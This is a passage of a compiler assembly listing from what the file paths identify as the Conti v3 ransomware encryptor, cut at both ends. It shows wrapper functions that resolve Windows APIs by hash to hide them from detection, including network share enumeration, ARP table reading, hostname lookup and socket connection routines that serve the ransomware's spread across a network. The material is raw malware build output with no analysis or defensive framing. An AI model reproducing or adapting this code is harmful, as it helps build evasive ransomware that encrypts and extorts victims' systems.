	ff ff ff	 mov	 DWORD PTR dwMilliseconds$dead$[rsp], -1 ; ffffffffH
  00043	4c 8b c6	 mov	 r8, rsi
  00046	48 8b d5	 mov	 rdx, rbp
  00049	48 8b cb	 mov	 rcx, rbx

; 438  : }

  0004c	48 8b 5c 24 40	 mov	 rbx, QWORD PTR [rsp+64]
  00051	48 8b 6c 24 48	 mov	 rbp, QWORD PTR [rsp+72]
  00056	48 8b 74 24 50	 mov	 rsi, QWORD PTR [rsp+80]
  0005b	48 83 c4 30	 add	 rsp, 48			; 00000030H
  0005f	5f		 pop	 rdi

; 437  : 	return pFunction(CompletionPort, lpNumberOfBytesTransferred, lpCompletionKey, lpOverlapped, dwMilliseconds);

  00060	48 ff e0	 rex_jmp rax
?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z ENDP ; pGetQueuedCompletionStatus
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pExitThread@@YAXK@Z
_TEXT	SEGMENT
dwExitCode$ = 48
?pExitThread@@YAXK@Z PROC				; pExitThread, COMDAT

; 443  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 444  : 	void(WINAPI * pFunction)(DWORD);
; 445  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  00011	8b d9		 mov	 ebx, ecx
  00013	44 8d 4a 38	 lea	 r9d, QWORD PTR [rdx+56]
  00017	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 446  : 	return pFunction(dwExitCode);

  0001c	8b cb		 mov	 ecx, ebx

; 447  : }

  0001e	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00022	5b		 pop	 rbx

; 446  : 	return pFunction(dwExitCode);

  00023	48 ff e0	 rex_jmp rax
?pExitThread@@YAXK@Z ENDP				; pExitThread
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z
_TEXT	SEGMENT
CompletionPort$dead$ = 48
dwNumberOfBytesTransferred$dead$ = 56
dwCompletionKey$ = 64
lpOverlapped$dead$ = 72
?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z PROC ; pPostQueuedCompletionStatus, COMDAT

; 456  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b 1d 00 00
	00 00		 mov	 rbx, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle

; 457  : 	BOOL(WINAPI * pFunction)(HANDLE, DWORD, ULONG_PTR, LPOVERLAPPED);
; 458  : 	pFunction = (BOOL(WINAPI*)(HANDLE, DWORD, ULONG_PTR, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x442d716b, 70);//GetProcAddress(hKernel32, OBFA("PostQueuedCompletionStatus"));

  00011	ba 0f 00 00 00	 mov	 edx, 15
  00016	49 8b f8	 mov	 rdi, r8
  00019	41 b8 6b 71 2d
	44		 mov	 r8d, 1143828843		; 442d716bH
  0001f	44 8d 4a 37	 lea	 r9d, QWORD PTR [rdx+55]
  00023	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 459  : 	return pFunction(CompletionPort, dwNumberOfBytesTransferred, dwCompletionKey, lpOverlapped);

  00028	45 33 c9	 xor	 r9d, r9d
  0002b	4c 8b c7	 mov	 r8, rdi
  0002e	33 d2		 xor	 edx, edx
  00030	48 8b cb	 mov	 rcx, rbx

; 460  : }

  00033	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00038	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0003c	5f		 pop	 rdi

; 459  : 	return pFunction(CompletionPort, dwNumberOfBytesTransferred, dwCompletionKey, lpOverlapped);

  0003d	48 ff e0	 rex_jmp rax
?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z ENDP ; pPostQueuedCompletionStatus
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pSleep@@YAXK@Z
_TEXT	SEGMENT
dwMilliseconds$ = 48
?pSleep@@YAXK@Z PROC					; pSleep, COMDAT

; 465  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 466  : 	void(WINAPI * pFunction)(DWORD);
; 467  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb09422e9, 69);//GetProcAddress(hKernel32, OBFA("Sleep"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 e9 22 94
	b0		 mov	 r8d, -1332469015	; b09422e9H
  00011	8b d9		 mov	 ebx, ecx
  00013	44 8d 4a 36	 lea	 r9d, QWORD PTR [rdx+54]
  00017	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 468  : 	return pFunction(dwMilliseconds);

  0001c	8b cb		 mov	 ecx, ebx

; 469  : }

  0001e	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00022	5b		 pop	 rbx

; 468  : 	return pFunction(dwMilliseconds);

  00023	48 ff e0	 rex_jmp rax
?pSleep@@YAXK@Z ENDP					; pSleep
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGlobalAlloc@@YAPEAXI_K@Z
_TEXT	SEGMENT
uFlags$dead$ = 48
dwBytes$dead$ = 56
?pGlobalAlloc@@YAPEAXI_K@Z PROC				; pGlobalAlloc, COMDAT

; 475  : {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 476  : 	HGLOBAL(WINAPI * pFunction)(UINT, SIZE_T);
; 477  : 	pFunction = (HGLOBAL(WINAPI*)(UINT, SIZE_T))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb2eb0cd3, 68);//GetProcAddress(hKernel32, OBFA("GlobalAlloc"));

  00004	ba 0f 00 00 00	 mov	 edx, 15
  00009	41 b8 d3 0c eb
	b2		 mov	 r8d, -1293218605	; b2eb0cd3H
  0000f	44 8d 4a 35	 lea	 r9d, QWORD PTR [rdx+53]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 478  : 	return pFunction(uFlags, dwBytes);

  00018	ba 40 00 00 00	 mov	 edx, 64			; 00000040H
  0001d	8b ca		 mov	 ecx, edx

; 479  : }

  0001f	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 478  : 	return pFunction(uFlags, dwBytes);

  00023	48 ff e0	 rex_jmp rax
?pGlobalAlloc@@YAPEAXI_K@Z ENDP				; pGlobalAlloc
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGlobalFree@@YAPEAXPEAX@Z
_TEXT	SEGMENT
hMem$ = 48
?pGlobalFree@@YAPEAXPEAX@Z PROC				; pGlobalFree, COMDAT

; 484  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 485  : 	HGLOBAL(WINAPI * pFunction)(HGLOBAL);
; 486  : 	pFunction = (HGLOBAL(WINAPI*)(HGLOBAL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8d87ce2b, 67);//GetProcAddress(hKernel32, OBFA("GlobalFree"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 2b ce 87
	8d		 mov	 r8d, -1920479701	; 8d87ce2bH
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 34	 lea	 r9d, QWORD PTR [rdx+52]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 487  : 	return pFunction(hMem);

  0001d	48 8b cb	 mov	 rcx, rbx

; 488  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 487  : 	return pFunction(hMem);

  00025	48 ff e0	 rex_jmp rax
?pGlobalFree@@YAPEAXPEAX@Z ENDP				; pGlobalFree
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
_TEXT	SEGMENT
lpCriticalSection$dead$ = 48
?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z PROC ; pDeleteCriticalSection, COMDAT

; 493  : {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 494  : 	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
; 495  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x22d94276, 66);//GetProcAddress(hKernel32, OBFA("DeleteCriticalSection"));

  00004	ba 0f 00 00 00	 mov	 edx, 15
  00009	41 b8 76 42 d9
	22		 mov	 r8d, 584663670		; 22d94276H
  0000f	44 8d 4a 33	 lea	 r9d, QWORD PTR [rdx+51]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 496  : 	return pFunction(lpCriticalSection);

  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection

; 497  : }

  0001f	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 496  : 	return pFunction(lpCriticalSection);

  00023	48 ff e0	 rex_jmp rax
?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ENDP ; pDeleteCriticalSection
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z
_TEXT	SEGMENT
FileHandle$ = 48
ExistingCompletionPort$ = 56
CompletionKey$ = 64
NumberOfConcurrentThreads$dead$ = 72
?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z PROC		; pCreateIoCompletionPort, COMDAT

; 505  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 74 24 10	 mov	 QWORD PTR [rsp+16], rsi
  0000a	57		 push	 rdi
  0000b	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000f	48 8b fa	 mov	 rdi, rdx
  00012	49 8b d8	 mov	 rbx, r8

; 506  : 	HANDLE(WINAPI * pFunction)(HANDLE, HANDLE, ULONG_PTR, DWORD);
; 507  : 	pFunction = (HANDLE(WINAPI*)(HANDLE, HANDLE, ULONG_PTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xac9084f4, 65);//GetProcAddress(hKernel32, OBFA("CreateIoCompletionPort"));

  00015	ba 0f 00 00 00	 mov	 edx, 15
  0001a	41 b8 f4 84 90
	ac		 mov	 r8d, -1399814924	; ac9084f4H
  00020	48 8b f1	 mov	 rsi, rcx
  00023	44 8d 4a 32	 lea	 r9d, QWORD PTR [rdx+50]
  00027	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 508  : 	return pFunction(FileHandle, ExistingCompletionPort, CompletionKey, NumberOfConcurrentThreads);

  0002c	45 33 c9	 xor	 r9d, r9d
  0002f	4c 8b c3	 mov	 r8, rbx
  00032	48 8b d7	 mov	 rdx, rdi
  00035	48 8b ce	 mov	 rcx, rsi

; 509  : }

  00038	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0003d	48 8b 74 24 38	 mov	 rsi, QWORD PTR [rsp+56]
  00042	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00046	5f		 pop	 rdi

; 508  : 	return pFunction(FileHandle, ExistingCompletionPort, CompletionKey, NumberOfConcurrentThreads);

  00047	48 ff e0	 rex_jmp rax
?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z ENDP		; pCreateIoCompletionPort
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateTimerQueue@@YAPEAXXZ
_TEXT	SEGMENT
?pCreateTimerQueue@@YAPEAXXZ PROC			; pCreateTimerQueue, COMDAT

; 512  : {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 513  : 	HANDLE(WINAPI * pFunction)();
; 514  : 	pFunction = (HANDLE(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x071a6760, 64);//GetProcAddress(hKernel32, OBFA("CreateTimerQueue"));

  00004	ba 0f 00 00 00	 mov	 edx, 15
  00009	41 b8 60 67 1a
	07		 mov	 r8d, 119170912		; 071a6760H
  0000f	44 8d 4a 31	 lea	 r9d, QWORD PTR [rdx+49]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 516  : }

  00018	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 515  : 	return pFunction();

  0001c	48 ff e0	 rex_jmp rax
?pCreateTimerQueue@@YAPEAXXZ ENDP			; pCreateTimerQueue
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pNetApiBufferFree@@YAKPEAX@Z
_TEXT	SEGMENT
Buffer$ = 48
?pNetApiBufferFree@@YAKPEAX@Z PROC			; pNetApiBufferFree, COMDAT

; 663  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 664  : 	DWORD(WINAPI * pFunction)(LPVOID);
; 665  : 	pFunction = (DWORD(WINAPI*)(LPVOID))getapi::GetProcAddressEx2(NULL, NETAPI32_MODULE_ID, 0x09223458, 51);//GetProcAddress(hNetApi32, OBFA("NetApiBufferFree"));

  00006	ba 11 00 00 00	 mov	 edx, 17
  0000b	41 b8 58 34 22
	09		 mov	 r8d, 153236568		; 09223458H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 22	 lea	 r9d, QWORD PTR [rdx+34]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 666  : 	return pFunction(Buffer);

  0001d	48 8b cb	 mov	 rcx, rbx

; 667  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 666  : 	return pFunction(Buffer);

  00025	48 ff e0	 rex_jmp rax
?pNetApiBufferFree@@YAKPEAX@Z ENDP			; pNetApiBufferFree
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z
_TEXT	SEGMENT
servername$ = 80
level$dead$ = 88
bufptr$ = 96
prefmaxlen$dead$ = 104
entriesread$ = 112
totalentries$ = 120
resume_handle$ = 128
?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z PROC		; pNetShareEnum, COMDAT

; 678  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 40	 sub	 rsp, 64			; 00000040H

; 679  : 	DWORD(WINAPI * pFunction)(WCHAR*, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD);
; 680  : 	pFunction = (DWORD(WINAPI*)(WCHAR*, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, NETAPI32_MODULE_ID, 0x40d14d9a, 50);//GetProcAddress(hNetApi32, OBFA("NetShareEnum"));

  0000a	ba 11 00 00 00	 mov	 edx, 17
  0000f	49 8b d8	 mov	 rbx, r8
  00012	41 b8 9a 4d d1
	40		 mov	 r8d, 1087458714		; 40d14d9aH
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 21	 lea	 r9d, QWORD PTR [rdx+33]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 681  : 	return pFunction(servername, level, bufptr, prefmaxlen, entriesread, totalentries, resume_handle);

  00024	41 b9 ff ff ff
	ff		 mov	 r9d, -1			; ffffffffH
  0002a	4c 8b c3	 mov	 r8, rbx
  0002d	48 8b cf	 mov	 rcx, rdi
  00030	ba 01 00 00 00	 mov	 edx, 1

; 682  : }

  00035	48 8b 5c 24 50	 mov	 rbx, QWORD PTR [rsp+80]
  0003a	48 83 c4 40	 add	 rsp, 64			; 00000040H
  0003e	5f		 pop	 rdi

; 681  : 	return pFunction(servername, level, bufptr, prefmaxlen, entriesread, totalentries, resume_handle);

  0003f	48 ff e0	 rex_jmp rax
?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z ENDP		; pNetShareEnum
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z
_TEXT	SEGMENT
IpNetTable$ = 48
SizePointer$ = 56
Order$dead$ = 64
?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z PROC	; pGetIpNetTable, COMDAT

; 690  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 691  : 	ULONG(WINAPI * pFunction)(PMIB_IPNETTABLE, PULONG, BOOL);
; 692  : 	pFunction = (ULONG(WINAPI*)(PMIB_IPNETTABLE, PULONG, BOOL))getapi::GetProcAddressEx2(NULL, IPHLPAPI_MODULE_ID, 0xeae677e7, 49);//GetProcAddress(hIphlp32, OBFA("GetIpNetTable"));

  0000d	41 b8 e7 77 e6
	ea		 mov	 r8d, -353994777		; eae677e7H
  00013	ba 12 00 00 00	 mov	 edx, 18
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 1f	 lea	 r9d, QWORD PTR [rdx+31]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 693  : 	return pFunction(IpNetTable, SizePointer, Order);

  00024	45 33 c0	 xor	 r8d, r8d
  00027	48 8b d3	 mov	 rdx, rbx
  0002a	48 8b cf	 mov	 rcx, rdi

; 694  : }

  0002d	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00032	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00036	5f		 pop	 rdi

; 693  : 	return pFunction(IpNetTable, SizePointer, Order);

  00037	48 ff e0	 rex_jmp rax
?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z ENDP	; pGetIpNetTable
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pgethostbyname@@YAPEAUhostent@@PEBD@Z
_TEXT	SEGMENT
name$ = 48
?pgethostbyname@@YAPEAUhostent@@PEBD@Z PROC		; pgethostbyname, COMDAT

; 833  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 834  : 	hostent* (WINAPI * pFunction)(const char*);
; 835  : 	pFunction = (hostent * (WINAPI*)(const char*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3f6d3769, 38);//GetProcAddress(hWs2_32, OBFA("gethostbyname"));

  00006	ba 15 00 00 00	 mov	 edx, 21
  0000b	41 b8 69 37 6d
	3f		 mov	 r8d, 1064122217		; 3f6d3769H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 11	 lea	 r9d, QWORD PTR [rdx+17]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 836  : 	return pFunction(name);

  0001d	48 8b cb	 mov	 rcx, rbx

; 837  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 836  : 	return pFunction(name);

  00025	48 ff e0	 rex_jmp rax
?pgethostbyname@@YAPEAUhostent@@PEBD@Z ENDP		; pgethostbyname
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pgethostname@@YAHPEADH@Z
_TEXT	SEGMENT
name$ = 48
namelen$dead$ = 56
?pgethostname@@YAHPEADH@Z PROC				; pgethostname, COMDAT

; 843  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 844  : 	int (WINAPI * pFunction)(char*, int);
; 845  : 	pFunction = (int (WINAPI*)(char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8ec21b05, 37);//GetProcAddress(hWs2_32, OBFA("gethostname"));

  00006	ba 15 00 00 00	 mov	 edx, 21
  0000b	41 b8 05 1b c2
	8e		 mov	 r8d, -1899881723	; 8ec21b05H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 10	 lea	 r9d, QWORD PTR [rdx+16]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 846  : 	return pFunction(name, namelen);

  0001d	ba 00 01 00 00	 mov	 edx, 256		; 00000100H
  00022	48 8b cb	 mov	 rcx, rbx

; 847  : }

  00025	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00029	5b		 pop	 rbx

; 846  : 	return pFunction(name, namelen);

  0002a	48 ff e0	 rex_jmp rax
?pgethostname@@YAHPEADH@Z ENDP				; pgethostname
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z
_TEXT	SEGMENT
s$ = 96
dwIoControlCode$dead$ = 104
lpvInBuffer$ = 112
cbInBuffer$dead$ = 120
lpvOutBuffer$dead$ = 128
cbOutBuffer$dead$ = 136
lpcbBytesReturned$ = 144
lpOverlapped$dead$ = 152
lpCompletionRoutine$dead$ = 160
?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z PROC ; pWSAIoctl, COMDAT

; 872  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 50	 sub	 rsp, 80			; 00000050H

; 873  : 	int(WINAPI * pFunction)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE);
; 874  : 	pFunction = (int(WINAPI*)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8460e293, 35);//GetProcAddress(hWs2_32, OBFA("WSAIoctl"));

  0000a	ba 15 00 00 00	 mov	 edx, 21
  0000f	49 8b d8	 mov	 rbx, r8
  00012	41 b8 93 e2 60
	84		 mov	 r8d, -2074025325	; 8460e293H
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 0e	 lea	 r9d, QWORD PTR [rdx+14]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 875  : 	return pFunction(s, dwIoControlCode, lpvInBuffer, cbInBuffer, lpvOutBuffer, cbOutBuffer, lpcbBytesReturned, lpOverlapped, lpCompletionRoutine);

  00024	33 c9		 xor	 ecx, ecx
  00026	48 89 8c 24 a0
	00 00 00	 mov	 QWORD PTR lpCompletionRoutine$dead$[rsp], rcx
  0002e	41 b9 10 00 00
	00		 mov	 r9d, 16
  00034	48 89 8c 24 98
	00 00 00	 mov	 QWORD PTR lpOverlapped$dead$[rsp], rcx
  0003c	4c 8b c3	 mov	 r8, rbx
  0003f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_ConnectEx@@3P6AH_KPEBUsockaddr@@HPEAXKPEAKPEAU_OVERLAPPED@@@ZEA ; g_ConnectEx
  00046	c7 84 24 88 00
	00 00 08 00 00
	00		 mov	 DWORD PTR cbOutBuffer$dead$[rsp], 8
  00051	ba 06 00 00 c8	 mov	 edx, -939524090		; c8000006H
  00056	48 89 8c 24 80
	00 00 00	 mov	 QWORD PTR lpvOutBuffer$dead$[rsp], rcx
  0005e	48 8b cf	 mov	 rcx, rdi

; 876  : }

  00061	48 8b 5c 24 60	 mov	 rbx, QWORD PTR [rsp+96]
  00066	48 83 c4 50	 add	 rsp, 80			; 00000050H
  0006a	5f		 pop	 rdi

; 875  : 	return pFunction(s, dwIoControlCode, lpvInBuffer, cbInBuffer, lpvOutBuffer, cbOutBuffer, lpcbBytesReturned, lpOverlapped, lpCompletionRoutine);

  0006b	48 ff e0	 rex_jmp rax
?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z ENDP ; pWSAIoctl
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pclosesocket@@YAH_K@Z
_TEXT	SEGMENT
s$ = 48
?pclosesocket@@YAH_K@Z PROC				; pclosesocket, COMDAT

; 881  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 882  : 	int(WINAPI * pFunction)(SOCKET);
; 883  : 	pFunction = (int(WINAPI*)(SOCKET))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3e3c66ba, 34);//GetProcAddress(hWs2_32, OBFA("closesocket"));

  00006	ba 15 00 00 00	 mov	 edx, 21
  0000b	41 b8 ba 66 3c
	3e		 mov	 r8d, 1044145850		; 3e3c66baH
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 0d	 lea	 r9d, QWORD PTR [rdx+13]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 884  : 	return pFunction(s);

  0001d	48 8b cb	 mov	 rcx, rbx

; 885  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 884  : 	return pFunction(s);

  00025	48 ff e0	 rex_jmp rax
?pclosesocket@@YAH_K@Z ENDP				; pclosesocket
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z
_TEXT	SEGMENT
lpsaAddress$ = 64
dwAddressLength$dead$ = 72
lpProtocolInfo$dead$ = 80
lpszAddressString$ = 88
lpdwAddressStringLength$ = 96
?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z PROC ; pWSAAddressToStringW, COMDAT

; 894  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 895  : 	int(WINAPI * pFunction)(LPSOCKADDR, DWORD, LPWSAPROTOCOL_INFOW, LPWSTR, LPDWORD);
; 896  : 	pFunction = (int(WINAPI*)(LPSOCKADDR, DWORD, LPWSAPROTOCOL_INFOW, LPWSTR, LPDWORD))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x6ae189ea, 33);//GetProcAddress(hWs2_32, OBFA("WSAAddressToStringW"));

  0000a	ba 15 00 00 00	 mov	 edx, 21
  0000f	49 8b d9	 mov	 rbx, r9
  00012	41 b8 ea 89 e1
	6a		 mov	 r8d, 1793165802		; 6ae189eaH
